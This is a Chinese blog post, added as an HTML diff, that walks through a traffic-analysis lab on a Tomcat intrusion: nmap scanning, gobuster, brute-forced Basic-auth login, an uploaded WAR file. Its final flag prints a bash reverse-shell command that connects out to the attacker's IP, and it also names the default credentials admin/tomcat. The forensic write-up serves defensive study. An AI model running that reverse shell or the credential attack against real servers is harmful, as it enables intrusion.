@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>第六章 流量特征分析-常见攻击事件 tomcat | Zephyr</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+<link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+
+<canvas id="particles"></canvas>
+<div class="progress-bar" id="progressBar"></div>
+
+
+<nav class="top-nav" id="topNav">
+  <div class="nav-left">
+    <a href="/" class="nav-brand">Zephyr</a>
+    <a href="https://github.com/Zephyr1ng" class="nav-github" target="_blank" rel="noopener">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+      GitHub
+    </a>
+  </div>
+  <ul class="nav-links">
+    
+      <li><a href="/">文章</a></li>
+    
+      <li><a href="/categories">分类</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/friends">友链</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+</nav>
+
+<div class="container">
+  <!-- Single post page -->
+<article class="post-full">
+  <header class="post-header">
+    <a href="/" class="back-link">← Home</a>
+    <h1 class="post-title">第六章 流量特征分析-常见攻击事件 tomcat</h1>
+    <div class="post-meta">
+      <time datetime="2025-02-28">2025-02-28</time>
+      
+    </div>
+  </header>
+
+  <div class="post-content">
+    <blockquote>
+<p>本文迁移自博客园，原文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zephyr07/articles/18743021">https://www.cnblogs.com/Zephyr07/articles/18743021</a></p>
+</blockquote>
+<h2 id="第一关-在web服务器上发现的可疑活动-流量分析会显示很多请求-这表明存在恶意的扫描行为-通过分析扫描的行为后提交攻击者IP-flag格式：flag-ip-，如：flag"><a href="#第一关-在web服务器上发现的可疑活动-流量分析会显示很多请求-这表明存在恶意的扫描行为-通过分析扫描的行为后提交攻击者IP-flag格式：flag-ip-，如：flag" class="headerlink" title="第一关:在web服务器上发现的可疑活动,流量分析会显示很多请求,这表明存在恶意的扫描行为,通过分析扫描的行为后提交攻击者IP flag格式：flag{ip}，如：flag"></a>第一关:在web服务器上发现的可疑活动,流量分析会显示很多请求,这表明存在恶意的扫描行为,通过分析扫描的行为后提交攻击者IP flag格式：flag{ip}，如：flag</h2><p>下载流量包打开，发现有很多SYN流量<br>这是nmap扫描的流量特征：<br>● 发送大量 SYN 包，尝试建立连接但不完成三次握手过程（半开连接）。<br>● TCP SYN 包的来源端口和目标端口多为随机，常见目标端口为 21（FTP）、22（SSH）、80（HTTP）、443（HTTPS）等常见服务端口。<br>● 如果目标主机回复 SYN-ACK 包，Nmap 会立即发送 RST 包来中断连接<br>flag{14.0.0.120}</p>
+<h2 id="第二关-找到攻击者IP后请通过技术手段确定其所在地址-flag格式-flag"><a href="#第二关-找到攻击者IP后请通过技术手段确定其所在地址-flag格式-flag" class="headerlink" title="第二关:找到攻击者IP后请通过技术手段确定其所在地址 flag格式: flag"></a>第二关:找到攻击者IP后请通过技术手段确定其所在地址 flag格式: flag</h2><p>直接ip查询就行了</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228130236712-772508099.png"></p>
+<p>flag{guangzhou}</p>
+<h2 id="第三关-哪一个端口提供对web服务器管理面板的访问？-flag格式：flag"><a href="#第三关-哪一个端口提供对web服务器管理面板的访问？-flag格式：flag" class="headerlink" title="第三关:哪一个端口提供对web服务器管理面板的访问？ flag格式：flag"></a>第三关:哪一个端口提供对web服务器管理面板的访问？ flag格式：flag</h2><p>流量包过滤http，看到访问admin目录，猜测是服务器管理面板<br>然后查看流量包发现8080<br>flag{8080}</p>
+<h2 id="第四关-经过前面对攻击者行为的分析后-攻击者运用的工具是？-flag格式：flag"><a href="#第四关-经过前面对攻击者行为的分析后-攻击者运用的工具是？-flag格式：flag" class="headerlink" title="第四关:经过前面对攻击者行为的分析后,攻击者运用的工具是？ flag格式：flag"></a>第四关:经过前面对攻击者行为的分析后,攻击者运用的工具是？ flag格式：flag</h2><p>本来直接交以为是nmap，最后不对，所以题目问的应该是是攻击工具，不是扫描工具<br>过滤http，发现有一堆访问examples目录的流量，然后还访问了&#x2F;manager&#x2F;html 和 &#x2F;host-manager&#x2F;html等敏感目录，所以追踪http流</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228130245191-1359201701.png"></p>
+<p>flag{gobuster}</p>
+<h2 id="第五关-攻击者拿到特定目录的线索后-想要通过暴力破解的方式登录-请通过分析流量找到攻击者登录成功的用户名和密码？-flag格式：flag"><a href="#第五关-攻击者拿到特定目录的线索后-想要通过暴力破解的方式登录-请通过分析流量找到攻击者登录成功的用户名和密码？-flag格式：flag" class="headerlink" title="第五关:攻击者拿到特定目录的线索后,想要通过暴力破解的方式登录,请通过分析流量找到攻击者登录成功的用户名和密码？ flag格式：flag"></a>第五关:攻击者拿到特定目录的线索后,想要通过暴力破解的方式登录,请通过分析流量找到攻击者登录成功的用户名和密码？ flag格式：flag</h2><p>题目说暴力破解登录，然后流量包发现有一堆404请求，然后在最后一个404后面有一个长目录访问，猜测成功登录<br>追踪http流，发现有一个Authorization 字段，后面跟着一个base64编码的内容，解码得到密码</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228130250843-1869418935.png"></p>
+<p>● HTTP基本认证是一种常见的用户认证方法。它的工作原理是通过HTTP头部的 Authorization 字段来传递用户的凭证<br>● Authorization 字段紧跟着一个 Basic 关键字，后面跟着一串Base64编码的字符串。<br>● 根据HTTP基本认证的标准，这串Base64编码的字符串实际上是 用户名:密码 的格式<br>flag{admin-tomcat}</p>
+<h2 id="第六关-攻击者登录成功后-先要建立反弹shell-请分析流量提交恶意文件的名称？-flag格式：flag"><a href="#第六关-攻击者登录成功后-先要建立反弹shell-请分析流量提交恶意文件的名称？-flag格式：flag" class="headerlink" title="第六关:攻击者登录成功后,先要建立反弹shell,请分析流量提交恶意文件的名称？ flag格式：flag"></a>第六关:攻击者登录成功后,先要建立反弹shell,请分析流量提交恶意文件的名称？ flag格式：flag</h2><p>让找反弹shell的文件，所以看请求包<br>然后流量包找到一个上传war压缩包的</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228130257272-587430032.png"></p>
+<p>尝试提交发现正确<br>（其实提取出来解压也能分析，大家可以尝试一下，就不演示了）<br>flag{JXQOZY.war}</p>
+<h2 id="第七关-攻击者想要维持提权成功后的登录-请分析流量后提交关键的信息？-flag提示-某种任务里的信息"><a href="#第七关-攻击者想要维持提权成功后的登录-请分析流量后提交关键的信息？-flag提示-某种任务里的信息" class="headerlink" title="第七关:攻击者想要维持提权成功后的登录,请分析流量后提交关键的信息？ flag提示,某种任务里的信息"></a>第七关:攻击者想要维持提权成功后的登录,请分析流量后提交关键的信息？ flag提示,某种任务里的信息</h2><p>让找可能维持提权成功后的登录，所以主要看一些文件上传（upload）和命令执行（bin）<br>先搜索http是否包含bin<br>http contains “&#x2F;bin”<br>发现没有命令（其实自己做的时候没有找到）<br>看了wp发现还能查tcp流量内容<br>tcp contains “&#x2F;bin”<br>发现这次查到了，追踪流找到执行的命令和反弹的shell进而维持权限</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228130305417-1909451906.png"></p>
+<p>flag{&#x2F;bin&#x2F;bash -c ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;14.0.0.120&#x2F;443 0&gt;&amp;1’}</p>
+
+  </div>
+
+  <!-- Donation Section -->
+  <div class="donation">
+    <div class="donation-divider">
+      <span>如果文章对你有帮助</span>
+    </div>
+    <p class="donation-hint">可以请我喝杯咖啡 ☕</p>
+    <div class="donation-qrs">
+      <div class="qr-card">
+        <img src="/images/alipay.jpg" alt="支付宝收款码" onerror="this.parentElement.style.display='none'">
+        <span>支付宝</span>
+      </div>
+      <div class="qr-card">
+        <img src="/images/wechat.jpg" alt="微信收款码" onerror="this.parentElement.style.display='none'">
+        <span>微信</span>
+      </div>
+    </div>
+  </div>
+
+  
+  <nav class="post-nav">
+    
+      <a href="/2025/02/28/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-waf-%E4%B8%8A%E7%9A%84%E6%88%AA%E8%8E%B7%E7%9A%84%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F/" class="prev">← 第六章 流量特征分析-waf 上的截获的黑客攻击流量</a>
+    
+    
+      <a href="/2025/02/28/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B0%8F%E7%8E%8B%E5%85%AC%E5%8F%B8%E6%94%B6%E5%88%B0%E7%9A%84%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/" class="next">第六章 流量特征分析-小王公司收到的钓鱼邮件 →</a>
+    
+  </nav>
+  
+</article>
+
+</div>
+
+<script src="/js/main.js"></script>
+</body>
+</html>
